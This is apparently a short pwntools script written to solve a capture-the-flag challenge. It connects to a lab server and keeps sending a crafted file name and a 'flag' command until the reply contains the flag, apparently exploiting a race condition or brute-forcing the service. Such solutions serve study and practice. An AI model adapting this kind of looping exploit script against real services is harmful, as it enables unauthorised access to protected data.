from pwn import *

# Connect to the challenge server
conn = remote('up.zoolab.org', 10931)


# Function to send a command and check if "flag" is in the response
def send_command_and_check(command):
    conn.sendline(command)
    response = conn.recvline().decode("utf-8").strip()
    print(response)
    if("FLAG" in response):
        #print(response)
        return True
    conn.sendline("flag")
    response = conn.recvline().decode("utf-8").strip()
    print(response)
    if("FLAG" in response):
        #print(response)
        return True
    return False

# Crafted file name to access the flag file
crafted_fname = "R"

# Continuously send commands until flag is outputted
while True:
    # Send a command to read the crafted file
    if(send_command_and_check(crafted_fname)):
        break

# Close the connection
conn.close()
